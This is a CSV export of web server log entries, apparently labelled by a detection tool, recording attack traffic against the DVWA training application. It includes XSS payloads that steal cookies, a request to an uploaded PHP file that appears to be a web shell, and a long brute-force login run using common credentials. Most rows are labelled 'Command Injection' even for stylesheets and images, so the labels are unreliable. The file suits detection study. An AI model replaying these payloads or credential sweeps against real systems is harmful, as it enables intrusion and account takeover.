access.log.1,Command Injection,05/Apr/2024:15:14:47 +0000,/vulnerabilities/xss_r/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/?name=+%3Cimg+src%3Dss+onError%3Dalert%28%22XSS%29%3E,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/ss,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/ss,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:01 +0000,/vulnerabilities/xss_r/?name=%3Cbody+onload%3Dalert%28document.cookie%29%3E,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:39 +0000,/vulnerabilities/sqli_blind/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:44 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:52 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:16:43 +0000,-,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/dvwa/css/login.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:40 +0000,/favicon.ico,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:40 +0000,/dvwa/images/login_logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/index.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/js/dvwaPage.js,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/css/main.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/images/logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/js/add_event_listeners.js,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:48 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:49 +0000,/dvwa/images/lock.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:51 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:52 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:19 +0000,/vulnerabilities/fi/?page=include.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:21 +0000,/vulnerabilities/csrf/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:21 +0000,/vulnerabilities/upload/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:27 +0000,/vulnerabilities/upload/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:40 +0000,/vulnerabilities/fi/?page=include.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:41 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:48 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:55 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:15:22:13 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:22:26 +0000,/hackable/uploads/totallynormal.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:51 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:51 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:52 +0000,/dvwa/css/login.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:52 +0000,/dvwa/images/login_logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:28:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:29:48 +0000,-,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Error Codes,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Command Injection,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Command Injection,05/Apr/2024:15:33:39 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:35:07 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:15:35:07 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:15:35:48 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:15:37:27 +0000,/,45.79.181.104,-
access.log.1,Command Injection,05/Apr/2024:15:54:14 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:14 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:07 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:07 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:24 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:25 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:30 +0000,/,192.155.88.231,-
access.log.1,Command Injection,05/Apr/2024:15:56:38 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:38 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:13 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:13 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/?username=root&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/?username=admin&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/?username=test&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:16 +0000,/vulnerabilities/brute/?username=guest&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/?username=info&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/?username=adm&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/?username=mysql&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/?username=user&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/?username=administrator&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/?username=oracle&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/?username=ftp&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/?username=pi&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/?username=puppet&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/?username=ansible&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/?username=root&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/?username=admin&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/?username=test&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/?username=guest&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/?username=info&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/?username=adm&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/?username=mysql&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/?username=user&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/?username=administrator&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/?username=oracle&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/?username=ftp&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/?username=pi&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=puppet&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=ansible&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/?username=root&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=admin&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=test&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/?username=guest&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=info&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=adm&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/?username=mysql&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=administrator&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/?username=oracle&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/?username=ftp&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=pi&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=puppet&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/?username=ansible&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=root&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=admin&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/?username=test&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=guest&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=info&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/?username=adm&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=mysql&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/?username=administrator&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=oracle&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=ftp&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/?username=pi&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=puppet&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=ansible&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=root&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=admin&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/?username=test&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/?username=guest&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:05 +0000,/vulnerabilities/brute/?username=info&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
